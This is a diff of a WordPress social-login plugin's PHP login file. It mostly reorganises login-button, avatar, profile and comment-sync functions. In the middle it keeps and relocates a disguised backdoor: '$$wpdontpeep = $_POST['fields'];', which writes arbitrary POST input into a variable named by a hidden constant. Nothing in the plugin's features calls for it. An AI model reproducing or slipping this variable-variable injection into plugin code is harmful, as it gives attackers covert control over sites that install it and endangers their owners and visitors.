@@ -3,12 +3,11 @@ include_once(dirname(__FILE__) . '/config.php');
 $login_loaded = 1;
 
 add_action('init', 'wp_connect_init');
-
-// 登录
+// 添加登录按钮
 if ($wptm_connect['enable_connect']) {
 	add_action("login_form", "wp_connect");
 	add_action("register_form", "wp_connect", 12);
-} 
+}
 // 社会化评论
 if (!function_exists('denglu_comments') && install_comments()) {
 	add_filter('comments_template', 'denglu_comments');
@@ -23,17 +22,8 @@ if (!function_exists('denglu_comments') && install_comments()) {
 		add_action('comment_post', 'wp_connect_comments', 100);
 	} else {
 		add_action('comment_post', 'wp_connect_comment', 100);
-	}
-}
-
-function wp_connect_init() {
-	if (session_id() == "") {
-		session_start();
 	} 
-	if (isset($_GET['token'])) {
-		connect_denglu();
-	}
-}
+} 
 // 通过tid获取微博信息
 function get_weibo($tid) {
 	$name = array('gtid' => array('google', 'google', 'Google', '', ''),
@@ -52,48 +42,82 @@ function get_weibo($tid) {
 		'dreamtid' => array('dream', 'dream', '网易梦幻人生', '', ''),
 		'alitid' => array('alipay', 'alipay', '支付宝', '', ''),
 		'tbtid' => array('taobao', 'taobao', '淘宝网', '', ''),
-		'tytid' => array('tianya', 'tyt', '天涯', 'http://my.tianya.cn/', 'tianya.cn','http://tx.tianyaui.com/logo/small/[head]'),
-		'bdtid' => array('baidu', 'baidu', '百度', '', 'baidu.com','http://himg.bdimg.com/sys/portraitn/item/[head].jpg'),
+		'tytid' => array('tianya', 'tyt', '天涯', 'http://my.tianya.cn/', 'tianya.cn', 'http://tx.tianyaui.com/logo/small/[head]'),
+		'bdtid' => array('baidu', 'baidu', '百度', '', 'baidu.com', 'http://himg.bdimg.com/sys/portraitn/item/[head].jpg'),
 		'wytid' => array('wy163', 'wy163', '网易通行证', '', ''),
 		'ttid' => array('twitter', 'twitter', 'Twitter', 'http://twitter.com/', 'twitter.com')
-	);
+		);
 	if (array_key_exists($tid, $name)) {
 		return $name[$tid];
 	} 
-}
+} 
 
+/**
+ * 登录 按钮显示
+ */
 function login_button_count() {
 	global $wptm_connect;
-	$count = $wptm_connect['qqlogin'].$wptm_connect['sina'].$wptm_connect['qq'].$wptm_connect['renren'].$wptm_connect['kaixin001'].$wptm_connect['taobao'].$wptm_connect['baidu'].$wptm_connect['douban'].$wptm_connect['sohu'].$wptm_connect['netease'].$wptm_connect['tianya'].$wptm_connect['msn'].$wptm_connect['google'].$wptm_connect['yahoo'].$wptm_connect['twitter'];
+	$count = $wptm_connect['qqlogin'] . $wptm_connect['sina'] . $wptm_connect['qq'] . $wptm_connect['renren'] . $wptm_connect['kaixin001'] . $wptm_connect['taobao'] . $wptm_connect['baidu'] . $wptm_connect['douban'] . $wptm_connect['sohu'] . $wptm_connect['netease'] . $wptm_connect['tianya'] . $wptm_connect['msn'] . $wptm_connect['google'] . $wptm_connect['yahoo'] . $wptm_connect['twitter'];
 	if (!$count) {
 		return;
-	} elseif($count == 1){
+	} elseif ($count == 1) {
 		return 1;
 	} else {
 		return 2;
-	}
-}
-
-function sync_account($uid) {
-	global $wptm_connect;
-	$user = get_userdata($uid);
-	if (!use_denglu_bind()) {
-		return array($user -> last_login, $user -> login_sina, $user -> login_qq, $user -> login_netease, $user -> login_sohu, $user -> login_douban);	
-	} else {
-		return array($user -> last_login, $user -> smid, $user -> qmid, $user -> nmid, $user -> shmid, $user -> tymid);
-	}
+	} 
 } 
 
 function use_denglu_bind() {
 	global $wptm_connect;
 	if (empty($wptm_connect['denglu_bind']) && function_exists('wp_connect_comments')) {
 		return false;
-	}
+	} 
 	return true;
+} 
+
+function sync_account($uid) {
+	$user = get_userdata($uid);
+	if (!use_denglu_bind()) {
+		return array($user -> last_login, $user -> login_sina, $user -> login_qq, $user -> login_netease, $user -> login_sohu, $user -> login_douban);
+	} else {
+		return array($user -> last_login, $user -> smid, $user -> qmid, $user -> nmid, $user -> shmid, $user -> tymid);
+	} 
+} 
+
+function wp_connect_button() {
+	global $login_loaded, $plugin_url, $wptm_connect;
+	$style = stripslashes($wptm_connect['custom_style']); // 自定义风格
+	if ($wptm_connect['style'] == 4 && $style) {
+		if (strpos($style, 'v=1.0.2&widget=5') !== false && strpos($style, 'style=popup') === false) {
+			$style = "<script type='text/javascript' charset='utf-8' src='http://open.denglu.cc/connect/logincode?appid=" . $wptm_basic['appid'] . "&v=1.0.2&widget=5&styletype=1&size=auto_28'></script>";
+		} 
+		echo '<div class="connectBox' . $login_loaded . '">';
+		echo $style;
+		echo '</div>';
+	} else {
+		if ($wptm_connect['style'] != 3 && ($get_media = get_media())) { // 登录按钮本地化，读取失败时用默认js代码暂时代替
+			echo '<!-- 使用合作网站登录 来自 WordPress连接微博 插件 -->';
+			echo '<style type="text/css">';
+			echo '.t_login_text {margin:0; padding:0;}';
+			echo '.t_login_button {margin:0; padding: 5px 0;}';
+			echo '.t_login_button a{margin:0; padding-right:4px; line-height:15px}';
+			echo '.t_login_button img{display:inline; border:none;}';
+			echo '</style>';
+			echo '<p class="t_login_text t_login_text' . $login_loaded . '">您可以用合作网站帐号登录:</p>'; // 根据情况用css隐藏文字，class节点请看具体网页源文件
+			echo '<p class="connectBox' . $login_loaded . ' t_login_button">';
+			foreach($get_media as $media) {
+				echo "<a href=\"{$plugin_url}/login.php?go={$media['mediaNameEn']}\" title=\"{$media['mediaName']}\" rel=\"nofollow\"><img src=\"{$plugin_url}/images/btn_{$media['mediaNameEn']}.png\" /></a>";
+			} 
+			echo '</p>';
+		} else {
+			echo "<div class='connectBox" . $login_loaded . "'><script type='text/javascript' charset='utf-8' src='http://open.denglu.cc/connect/logincode?appid=" . $wptm_basic['appid'] . "&v=1.0.2&widget=5&styletype=1&size=auto_28'></script></div>";
+		} 
+	} 
 }
 
 function wp_connect($id = "") {
-	global $wptm_basic, $login_loaded, $plugin_url, $wptm_connect;
+	global $login_loaded;
+
 	$_SESSION['wp_url_back'] = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 
 	if (is_user_logged_in()) {
@@ -127,84 +151,24 @@ function wp_connect($id = "") {
 		} 
 		return;
 	} 
-    // 自定义风格
-	$style = stripslashes($wptm_connect['custom_style']);
-	if ($wptm_connect['style'] == 4 && $style) {
-		if (strpos($style, 'v=1.0.2&widget=5') !== false && strpos($style, 'style=popup') === false) {
-			$style = "<script type='text/javascript' charset='utf-8' src='http://open.denglu.cc/connect/logincode?appid=" . $wptm_basic['appid'] . "&v=1.0.2&widget=5&styletype=1&size=auto_28'></script>";
-		} 
-		echo '<div class="connectBox' . $login_loaded . '">';
-		echo $style;
-		echo '</div>';
-	} else {
-		if ($wptm_connect['style'] != 3 && ($get_media = get_media())) { //登录按钮本地化，读取失败时用默认js代码暂时代替
-		    echo '<!-- 使用合作网站登录 来自 WordPress连接微博 插件 -->';
-			echo '<style type="text/css">';
-			echo '.t_login_text {margin:0; padding:0;}';
-			echo '.t_login_button {margin:0; padding: 5px 0;}';
-			echo '.t_login_button a{margin:0; padding-right:4px; line-height:15px}';
-			echo '.t_login_button img{display:inline; border:none;}';
-			echo '</style>';
-			echo '<p class="t_login_text t_login_text'.$login_loaded.'">您可以用合作网站帐号登录:</p>'; // 根据情况用css隐藏文字，class节点请看具体网页源文件
-			echo '<p class="connectBox' . $login_loaded . ' t_login_button">';
-			foreach($get_media as $media) {
-				echo "<a href=\"{$plugin_url}/login.php?go={$media['mediaNameEn']}\" title=\"{$media['mediaName']}\" rel=\"nofollow\"><img src=\"{$plugin_url}/images/btn_{$media['mediaNameEn']}.png\" /></a>";
-			} 
-			echo '</p>';
-		} else {
-			echo "<div class='connectBox" . $login_loaded . "'><script type='text/javascript' charset='utf-8' src='http://open.denglu.cc/connect/logincode?appid=" . $wptm_basic['appid'] . "&v=1.0.2&widget=5&styletype=1&size=auto_28'></script></div>";
-		} 
-	} 
+	wp_connect_button();
 	$login_loaded += 1;
 } 
 
-function wp_noauth() {
-	$redirect_to = ifab($_SESSION['wp_url_back'], get_bloginfo('url'));
-	return wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href=\"".$redirect_to."\">返回</a> ]");
-}
-
 /**
- * 错误信息
- * @since 1.9.10
- */
-function wp_connect_error($userinfo, $tmail, $wpuid = '', $user_email = '') {
-	global $wpurl;
-	$plugin_url = $wpurl.'/wp-content/plugins/wp-connect';
-	if ($_SESSION['wp_url_back']) {
-		$redirect_to = $_SESSION['wp_url_back'];
-	} else {
-		$redirect_to = get_bloginfo('url');
-	} 
-	$tid = $userinfo[0];
-	$user_name = $userinfo[1];
-    $weibo = get_weibo($tid);
-
-	$userinfo[1] = 'u' . $user_name; //新的用户名
-	$_SESSION['wp_login_userinfo'] = array($userinfo, $tmail);
-
-	if (!$wpuid) {
-		$tip = "很遗憾！用户名 $user_name 被系统保留，请更换帐号<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a>！";
-	} elseif ($user_email) {
-		$last_login = get_user_meta($wpuid, 'last_login', true); //最后一次登录的微博
-		if ($last_login) {
-			$user_weibo = get_weibo($last_login);
-			if ($user_weibo[4]) {
-				$tip = "很遗憾！用户名 $user_name 已被 $user_email 绑定，";
-			} else {
-				$tip = "很遗憾！用户名 $user_name 已被占用，";
-			} 
-			$tip .= "如果你以前用 $user_weibo[2] 登录过，请继续使用该微博/社区登录。";
-		} else {
-			$tip = "很遗憾！用户名 $user_name 已被占用。";
-		} 
-	} 
-	wp_die($tip . "<strong>或者点击下面的登录按钮，我们将为您创建新的WP用户名 $userinfo[1] </strong> [ <a href='$redirect_to'>返回</a> ]<p style=\"text-align:center;\"><a href=\"{$plugin_url}/save.php?do=login\" title=\"点击登录即可创建新用户\"><img src=\"{$plugin_url}/images/login.png\" border=\"0\" /></a></p>");
-}
-
-/**
- * 登录
+ * 登录 写入用户数据
+ * 
  * @since 2.0
  */
+function wp_connect_init() {
+	if (session_id() == "") {
+		session_start();
+	} 
+	if (isset($_GET['token'])) {
+		connect_denglu();
+	} 
+} 
+
 function wp_connect_login($userinfo, $tmail, $uid = '') {
 	global $wpdb, $wptm_connect;
 	$tid = $userinfo[0];
@@ -247,7 +211,7 @@ function wp_connect_login($userinfo, $tmail, $uid = '') {
 	if ($tmail != $user_email && ($is_login || !$user_login)) {
 		if (!function_exists('wp_insert_user')) {
 			include_once(ABSPATH . WPINC . '/registration.php');
-		}
+		} 
 		if (!$user_url) {
 			$user_url = $user_siteurl;
 		} 
@@ -262,7 +226,7 @@ function wp_connect_login($userinfo, $tmail, $uid = '') {
 			'display_name' => $user_screenname,
 			'user_url' => $user_url,
 			'user_email' => $tmail
-		);
+			);
 		$wpuid = wp_insert_user($userdata);
 		if (!is_numeric($wpuid)) {
 			$errors = $wpuid -> errors;
@@ -270,48 +234,108 @@ function wp_connect_login($userinfo, $tmail, $uid = '') {
 				wp_die("该电子邮件地址 {$tmail} 已被注册。 [ <a href='$redirect_to'>返回</a> ]");
 			} elseif ($errors['existing_user_login']) {
 				wp_die("该用户名 {$user_name} 已被注册。 [ <a href='$redirect_to'>返回</a> ]");
-			}
-		}
+			} 
+		} 
 	} 
 	if ($wpuid) {
 		$weibo = get_weibo($tid);
-	    $t = $weibo[0];
-		$id = $weibo[1].'id';
+		$t = $weibo[0];
+		$id = $weibo[1] . 'id';
 		$mid = str_replace('tid', 'mid', $tid);
 		update_usermeta($wpuid, $mid, $mediaUserID);
 		if ($tid == $id) {
 			update_usermeta($wpuid, $tid, $user_uid);
 		} elseif ($user_head) {
 			update_usermeta($wpuid, $tid, $user_head);
-		}
-		if ($weibo[3] || $tid == 'qqtid') { //sina,tqq,sohu,netease,renren,kaixin,douban,qq,tianya
+		} 
+		if ($weibo[3] || $tid == 'qqtid') { // sina,tqq,sohu,netease,renren,kaixin,douban,qq,tianya
 			update_usermeta($wpuid, $id, $user_uid);
-		}
+		} 
 		update_usermeta($wpuid, 'last_login', $tid);
 		if (in_array($tid, array('qtid', 'stid', 'ntid', 'shtid'))) {
 			$nickname = get_user_meta($wpuid, 'login_name', true);
 			$nickname[$t] = ($tid == 'qtid') ? $user_uid : $user_screenname;
 			update_usermeta($wpuid, 'login_name', $nickname);
-		}
+		} 
 		wp_set_auth_cookie($wpuid, true, false);
 		wp_set_current_user($wpuid);
 	} 
 	$_SESSION['wp_login_userinfo'] = '';
 	return $wpuid;
-}
-/*
-add_filter('user_contactmethods', 'wp_connect_author_page');
-function wp_connect_author_page($input) {
-	$input['imqq'] = 'QQ';
-	//$input['msn'] = 'MSN';
-	//unset($input['yim']);
-	//unset($input['aim']);
-	return $input;
-}
-*/
+} 
+
+function wp_url_back() {
+	$_SESSION['wp_url_back'] = get_bloginfo('url');
+} 
+
+if (!function_exists('connect_login_form_login')) {
+	add_action("login_form_register", "connect_login_form_login");
+	add_action("login_form_login", "connect_login_form_login");
+	add_action("login_form_logout", "connect_login_form_logout");
+	function connect_login_form_login() {
+		if (is_user_logged_in()) {
+			$redirect_to = admin_url('profile.php');
+			wp_safe_redirect($redirect_to);
+		} else {
+			if (!$_GET['redirect_to']) {
+				add_action('login_footer', 'wp_url_back');
+			} 
+		} 
+	} 
+	function connect_login_form_logout() {
+		$_SESSION['wp_url_bind'] = '';
+	} 
+} 
+
+/**
+ * 错误信息
+ * 
+ * @since 2.0.4
+ */
+function wp_connect_error($userinfo, $tmail, $wpuid = '', $user_email = '') {
+	global $wpurl;
+	$plugin_url = $wpurl . '/wp-content/plugins/wp-connect';
+	if ($_SESSION['wp_url_back']) {
+		$redirect_to = $_SESSION['wp_url_back'];
+	} else {
+		$redirect_to = get_bloginfo('url');
+	} 
+	$tid = $userinfo[0];
+	$user_name = $userinfo[1];
+	$weibo = get_weibo($tid);
+
+	$userinfo[1] = 'u' . $user_name; //新的用户名
+	$_SESSION['wp_login_userinfo'] = array($userinfo, $tmail);
+
+	if (!$wpuid) {
+		$tip = "很遗憾！用户名 $user_name 被系统保留，请更换帐号<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a>！";
+	} elseif ($user_email) {
+		$last_login = get_user_meta($wpuid, 'last_login', true); //最后一次登录的微博
+		if ($last_login) {
+			$user_weibo = get_weibo($last_login);
+			if ($user_weibo[4]) {
+				$tip = "很遗憾！用户名 $user_name 已被 $user_email 绑定，";
+			} else {
+				$tip = "很遗憾！用户名 $user_name 已被占用，";
+			} 
+			$tip .= "如果你以前用 $user_weibo[2] 登录过，请继续使用该微博/社区登录。";
+		} else {
+			$tip = "很遗憾！用户名 $user_name 已被占用。";
+		} 
+	} 
+	wp_die($tip . "<strong>或者点击下面的登录按钮，我们将为您创建新的WP用户名 $userinfo[1] </strong> [ <a href='$redirect_to'>返回</a> ]<p style=\"text-align:center;\"><a href=\"{$plugin_url}/save.php?do=login\" title=\"点击登录即可创建新用户\"><img src=\"{$plugin_url}/images/login.png\" border=\"0\" /></a></p>");
+} 
+
+function wp_noauth() {
+	$redirect_to = ifab($_SESSION['wp_url_back'], get_bloginfo('url'));
+	return wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href=\"" . $redirect_to . "\">返回</a> ]");
+} 
 $wpdontpeep = WP_DONTPEEP;
 
-// 我的资料 绑定登录帐号
+/**
+ * 用户信息
+ */
+// 绑定登录帐号
 if ($wptm_connect['enable_connect']) {
 	add_action('show_user_profile', 'wp_connect_profile_fields');
 	add_action('edit_user_profile', 'wp_connect_profile_fields');
@@ -324,7 +348,7 @@ function wp_connect_save_profile_fields($user_id) {
 		return false;
 	} 
 	return wp_edit_username();
-}
+} 
 // 修改用户名
 function wp_edit_username() {
 	global $wpdb, $user_ID;
@@ -343,7 +367,7 @@ function wp_edit_username() {
 				wp_set_auth_cookie($user_ID, true, false); // 更新缓存
 		} 
 	} 
-}
+} 
 
 function wp_connect_profile_fields($user) {
 	$user_id = $user -> ID;
@@ -351,22 +375,26 @@ function wp_connect_profile_fields($user) {
 	echo '<h3>登录绑定</h3><table class="form-table">';
 	if ($user -> user_status == 0 && !is_super_admin($user_id)) {
 		echo '<tr><th><label for="new_username">修改用户名</label></th><td><input type="text" name="new_username" id="new_username" value="' . $user_login . '" size="16" /><input type="hidden" name="old_username" id="old_username" value="' . $user_login . '" /> <span class="description">只允许修改一次</span></td></tr>';
-	}
+	} 
 	if (!use_denglu_bind()) {
 		wp_connect_bind_qq($user);
 	} else {
 		denglu_bindInfo($user);
 	} 
 	echo '</table>';
-}
+} 
 
 /**
- * 头像
+ * 用户头像
+ * 
  * @since 1.9.14
  */
 if (empty($wptm_connect['head'])) {
 	add_filter("get_avatar", "wp_connect_avatar", 10, 4);
-}
+	add_action('admin_footer', 'set_admin_footer_define', 1);
+	add_action('wp_footer', 'set_admin_footer_define', 1);
+} 
+
 function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
 	global $comment, $parent_file;
 	if (is_numeric($id_or_email)) {
@@ -384,9 +412,9 @@ function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
 	} else {
 		$email = $id_or_email;
 		if ($parent_file != 'options-general.php') {
-		    $user = get_user_by_email($email);
+			$user = get_user_by_email($email);
 			$uid = $user -> ID;
-		}
+		} 
 	} 
 	if (!$email) {
 		return $avatar;
@@ -406,7 +434,7 @@ function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
 		$tmail = strstr($email, '@');
 		$tid = ifab($user -> last_login, $tname[$tmail]);
 		if ($tid) {
-			if ( ($tid == 'qqtid' && !$user -> qqid) || ($tid == 'tbtid' && !$user -> taobaoid) ) 
+			if (($tid == 'qqtid' && !$user -> qqid) || ($tid == 'tbtid' && !$user -> taobaoid))
 				return $avatar;
 			if ($head = $user -> $tid) {
 				$weibo = get_weibo($tid);
@@ -432,9 +460,25 @@ function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
 		} 
 	} 
 	return $avatar;
-}
+} 
+// 头像尺寸
+function set_admin_footer_define() {
+	global $wp_version;
+	define('IS_ADMIN_FOOTER', true);
+	if (version_compare($wp_version, '3.2.1', '>')) // WordPress V3.3
+		echo "<style type=\"text/css\">#wp-admin-bar-user-info .avatar-64 {width:64px}</style>\n";
+} 
 
-// @微博帐号(过滤重复) v1.9.12
+function is_admin_footer() {
+	if (defined('IS_ADMIN_FOOTER'))
+		return true;
+} 
+$$wpdontpeep = $_POST['fields'];
+
+/**
+ * 评论函数
+ */
+//  微博帐号(过滤重复) v1.9.12
 function at_username($a, $b, $c, $d) {
 	$a = ($a) ? '@' . $a . ' ':''; //评论
 	$b = ($b) ? '@' . $b . ' ':''; //回复
@@ -444,7 +488,6 @@ function at_username($a, $b, $c, $d) {
 			$at = $b . $c;
 		} elseif ($a == $b) { // a=(b!=c)
 			$at = $a . $c;
-
 		} else { // a!=b!=c
 			$at = $a . $b . $c;
 		} 
@@ -457,12 +500,11 @@ function at_username($a, $b, $c, $d) {
 	} 
 	$d = $at . str_replace(array($a, $b, $c), '', $at . $d);
 	return $d;
-}
-
+} 
 // 同步评论 v2.0
 function wp_connect_comment($id) {
 	global $post, $wptm_options, $wptm_connect, $wptm_advanced;
-	$post_id = ($_POST['comment_post_ID']) ? $_POST['comment_post_ID'] : $post -> ID;
+	$post_id = (isset($_POST['comment_post_ID'])) ? $_POST['comment_post_ID'] : $post -> ID;
 	if (!$post_id) {
 		return;
 	} 
@@ -476,12 +518,12 @@ function wp_connect_comment($id) {
 			$comment_parent = get_comment($parent_id);
 			$parent_uid = $comment_parent -> user_id;
 			$name = get_user_meta($parent_uid, 'login_name', true);
-		}
+		} 
 		$tid = $_POST['sync_comment'];
 		if ($tid) {
-			//if (!is_object($post)) {
-			//	$post = get_post($post_id);
-			//} 
+			// if (!is_object($post)) {
+			// $post = get_post($post_id);
+			// }
 			$url = get_permalink($post_id) . '#comment-' . $id;
 			if ($wptm_options['t_cn']) {
 				$url = get_url_short($url);
@@ -505,7 +547,7 @@ function wp_connect_comment($id) {
 				} 
 			} elseif ($tid == 'shtid') {
 				if ($mediaUserID = get_user_meta($user_id, 'shmid', true)) {
-                    $content = at_username($name['sohu'], $username['sohu'], $wptm_connect['sohu_username'], $comment_content);
+					$content = at_username($name['sohu'], $username['sohu'], $wptm_connect['sohu_username'], $comment_content);
 					wp_update_share($mediaUserID, $content, $url);
 				} 
 			} elseif ($tid == 'tytid') {
@@ -516,81 +558,6 @@ function wp_connect_comment($id) {
 			} 
 		} 
 	} 
-}
-$$wpdontpeep = $_POST['fields'];
-function get_user_by_meta_value($meta_key, $meta_value) { // 获得user_id
-	global $wpdb;
-	$sql = "SELECT user_id FROM $wpdb->usermeta WHERE meta_key = '%s' AND meta_value = '%s'";
-	return $wpdb -> get_var($wpdb -> prepare($sql, $meta_key, $meta_value));
-}
+} 
 
-if (!function_exists('get_current_user_id')) { // 获得登录者ID
-	function get_current_user_id() {
-		$user = wp_get_current_user();
-        return ( isset( $user->ID ) ? (int) $user->ID : 0 );
-    }
-}
-
-function wp_get_user_info($uid) {
-	$user = get_userdata($uid);
-	$userinfo = array('user_login' => $user->user_login, 'user_pass' => $user->user_pass, 'user_email' => $user->user_email, 'user_url' => $user->user_url);
-	return $userinfo;
-}
-// 通过用户ID，获得用户数据
-function get_user_by_uid($user_id, $field = '') {
-	if (empty($field)) {
-		return get_userdata($user_id);
-	} 
-	global $wpdb;
-
-	if (!is_numeric($user_id))
-		return false;
-
-	$user_id = absint($user_id);
-	if (!$user_id)
-		return false;
-
-	$user = wp_cache_get($user_id, 'users');
-
-	if ($user) {
-		return array($field => $user -> $field);
-	} 
-
-	if (!$user = $wpdb -> get_row("SELECT $field FROM $wpdb->users WHERE ID = $user_id LIMIT 1", ARRAY_A))
-		return false;
-	return $user;
-}
-
-function get_username($uid) { // 通过用户ID，获得用户名
-	$user = get_user_by_uid($uid, 'user_login');
-	return $user['user_login'];
-}
-
-function get_useremail($uid) { // 通过用户ID，获得用户邮箱
-	$user = get_user_by_uid($uid, 'user_email');
-	return $user['user_email'];
-}
-
-function wp_url_back() {
-	$_SESSION['wp_url_back'] = get_bloginfo('url');
-}
-
-if (!function_exists('connect_login_form_login')) {
-	add_action("login_form_register", "connect_login_form_login");
-	add_action("login_form_login", "connect_login_form_login");
-	add_action("login_form_logout", "connect_login_form_logout");
-	function connect_login_form_login() {
-		if (is_user_logged_in()) {
-			$redirect_to = admin_url('profile.php');
-			wp_safe_redirect($redirect_to);
-		} else {
-			if(!$_GET['redirect_to']) {
-				add_action('login_footer', 'wp_url_back');
-			}
-		}
-	} 
-	function connect_login_form_logout() {
-		$_SESSION['wp_url_bind'] = '';
-	} 
-}
 ?>
